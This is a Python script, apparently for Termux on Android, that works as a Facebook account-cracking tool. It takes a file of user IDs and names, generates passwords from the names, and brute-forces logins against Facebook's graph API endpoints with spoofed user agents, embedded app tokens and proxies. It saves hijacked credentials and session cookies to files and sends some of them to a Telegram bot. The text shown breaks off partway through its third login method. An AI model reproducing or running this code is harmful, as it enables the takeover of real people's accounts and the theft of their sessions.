import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib, threading, tempfile, zipfile
from os import system
from io import BytesIO
from time import localtime as lt
from pip._vendor import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from urllib.parse import quote
import webbrowser


GITHUB_RAW_BASE = "https://github.com/lm9011109t-pixel/Facebook-/raw/refs/heads/main/"
webbrowser.open('https://t.me/ali313eme')
G = "\x1b[38;5;93m"
R = "\x1b[38;5;93m"
W = "\x1b[38;5;15m"
B = "\x1b[38;5;93m"
Y = "\x1b[38;5;93m"
A = "\x1b[38;5;93m"
O = "\x1b[38;5;93m"
X = "\x1b[38;5;93m"
P = "\x1b[38;5;93m"

BLUE_LIGHT = "\033[1;34m"
BLUE_DARK = "\033[0;34m"
BLUE_BRIGHT = "\033[1;94m"
CYAN = "\033[1;36m"

xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"

try:
    requests.get("https://www.google.com", timeout=5)
except requests.exceptions.ConnectionError:
    system("clear" if os.name == "posix" else "cls")
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{R}━"*56)
    sys.exit()

sys.stdout.write('\x1b[1;37m\x1b]2; PS~\x07')
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{R}/{W}{__months__}{R}/{W}{__years__}'
ltx = int(lt()[3])
a = ltx - 12 if ltx > 12 else ltx
tag = "PM" if ltx > 12 else "AM"
try:
    system("clear" if os.name == "posix" else "cls")
    system("rm -rf /sdcard/.txt > /dev/null 2>&1")
    with open("/sdcard/.txt", "w") as f:
        f.write(" ")
except PermissionError:
    print(f"{xp} WITHOUT STORAGE PERMISSION YOU CANNOT ")
    print(f"{xp} RUN THIS TOOL ALLOW STORAGE PERMISSION ")
    print(f"{R}━"*56)
    system("termux-setup-storage -y > /dev/null 2>&1")
    sys.exit(f"{xp} RUN AGAIN THIS TOOL ")
def __CLEAR__():
    system("clear" if os.name == "posix" else "cls")
    print(logo)
def __LINE__():
    print(f"{R}━"*56)
def UA():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM={density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___Noor_on_Fire___
versn ='2.0'
xlinex = (f"{R}━"*56)
version ='2.0'
xlinex = (f"{R}━"*56)
webbrowser.open('https://t.me/ali313eme')
logo = f"""
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉

{xlinex}
{W}  DEVELOPER {xpxx} PS+ zeuy{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{xlinex}
{R}⫷⫸ 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s ⫷ zeuy + @R7_36 ⫸
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} PS ~ p7s7s + zeuy + R7_36
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""
class __PS__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.sea = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []
        self.working_proxies = []
        self.user_agents = []
        self.subscription_info = {}
        self.subscription_key = None

    def __MENU__(self) -> None:
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __LINE__()
            print(f"{xp} RANDOM CLONE COMING SOON...! ")
            time.sleep(1.1)
            self.__MENU__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    def __FILEX__(self) -> None:
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} {R}/{W}sdcard{R}/{W}ids.txt{R}/{W}OR{R}/{W}File.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except PermissionError:
            __LINE__()
            print(f"{xp} ALLOW STORAGE PERMISSION ")
            time.sleep(1.2)
            __LINE__()
            sys.exit()
        except IOError:
            __LINE__()
            print(f"{xp} FILE READING ERROR TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()
        print(f"{xp1} METHOD {R}<[{W}GRAPH{R}]>{W}")
        print(f"{xp2} METHOD {R}<[{W}B-GRAPH{R}]>{W}")
        print(f"{xp3} METHOD {R}<[{W}API{R}]>{W}")
        print(f"{xp4} METHOD {R}<[{W}B-API{R}]>{W}")
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            __CLEAR__()
            print(f"{xp1} AUTO WEAK  PASSLIST ")
            print(f"{xp2} AUTO GOOD  PASSLIST ")
            print(f"{xp3} AUTO VERY GOOD  PASSLIST ")
            print(f"{xp4} AUTO STRONG  PASSLIST ")
            print(f"{xp5} AUTO VERY STRONG   PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

            if __COUNTRYPAS__ == "1":
                self.plist.extend(["firstlast", "first last","first", "first112233", "first1234567", "first123456789", "first123456", "first12345678", "first1234", "first123"])
            elif __COUNTRYPAS__ == "2":
                self.plist.extend(["first123", "first@1234", "first@12345", "first786", "first110", "firstlast", "firstlast", "firstlast12", "firstlast123", "firstlast12345", "first@123", "last123", "last12345"])
            elif __COUNTRYPAS__ == "3":
                self.plist.extend(["firstlast", "first last", "first123", "57273200", "59039200", "234567", "708090", "firstlast", "firstlast123", "firstlast1234", "first123", "first2025", "first@", "first@@", "57273200"])
            elif __COUNTRYPAS__ == "4":
                self.plist.extend(["first123", "first12345", "first@123", "first@1234", "first last", "firstlast123", "firstlast@123", "first last123", "first123456789", "first123@", "first123@@", "first12345@"])
            else:
                self.plist.extend(["firstlast","first@","first last@@","firstlast12345","firstlast1234","firstlast@@","firstlast@","first@@"])
        else:
            try:
                __CLEAR__()
                print(f"{xp} ALGERIAN PASSLIST 10{R}/{W}15 LIMIT")
                print(f"{xp} OTHERS COUNTRY PASSLIST 5{R}/{W}10 LIMIT")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} PASSLIST LIMIT {xpxx} "))
            except:
                __PASSFM__ = 5

            __CLEAR__()
            print(f"{xp} EXAMPLE  {xpxx} firstlast {R}/{W} first12 {R}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASSLIST {R}<[{W}{i+1}{R}]> {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED {R}<[{W}20{R}]> ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 20
        else:
            try:
                __CLEAR__()
                print(f"{xp} MAXIMUM SPEED LIMIT 20-40 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
            except ValueError:
                __MAXX__ = 40

        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")
        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW CP{R}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')
        with ThreadPool(max_workers=__MAXX__) as __PS__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL{R}/{W}IDS {xpxx} {total_ids} ")
            print(f"{xp} IF NO RESULT ON{R}/{W}OFF AIRPLANE MODE")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __PS__.submit(self.__M1X__, ids, names, passlist)
                elif __METHODF__ == "2":
                    __PS__.submit(self.__M2X__, ids, names, passlist)
                elif __METHODF__ == "3":
                    __PS__.submit(self.__M3X__, ids, names, passlist)
                elif __METHODF__ == "4":
                    __PS__.submit(self.__M4X__, ids, names, passlist)
                elif __METHODF__ == "5":
                    __PS__.submit(self.__M5X__, ids, names, passlist)
                else:
                    __PS__.submit(self.__M1X__, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{R}/{W}2F{R}/{W}CP {xpxx} {G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()

    def __M1X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>'
                f'{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()

            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                ua = self.get_random_ua()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                fbbv = str(random.randint(10000000, 99999999))
                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                width = random.randint(720, 1440)
                height = random.randint(1080, 2560)
                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM={density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM={density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM={density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": accessToken,
                    "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(11111, 99999)),
                    "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "Content-Length": "699"
                }
                url = "https://graph.facebook.com/auth/login"
                twf = "Login approval's are on. Expect an SMS shortly with a code to use for log in"

                try:
                    proxies = self.get_random_proxy()
                    if proxies:
                        po = requests.post(url, data=data, headers=headers, timeout=10, proxies=proxies).json()
                    else:
                        po = requests.post(url, data=data, headers=headers, timeout=10).json()
                except requests.exceptions.Timeout:
                    print(f"\n{R}Problem with the inspection")
                    continue
                except Exception as e:
                    print(f"\n{R}Use Vibene, my love")
                    continue

                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {colorX}{cookie}')
                    open('/sdcard/PS-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M1 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={idspas}")
                    break

                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')

                    open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break

                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1

        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

    def __M2X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{R}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = self.get_random_ua()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    'adid': adid,
                    'format': 'json',
                    'device_id': device_id,
                    'email': ids,
                    'password': f"#{pax}:0:{int(time.time())}:{pas}",
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': country_locale,
                    'client_country_code': country_code,
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': f'{accessToken}',
                }
                headers = {
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'Authorization': f'OAuth {accessToken}',
                    'X-FB-Connection-Type': random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                }
                url = "https://b-graph.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                proxies = self.get_random_proxy()
                if proxies:
                    po = requests.post(url, data=data, headers=headers, proxies=proxies).json()
                else:
                    po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M2 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')

                    open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

    def __M3X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M3{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
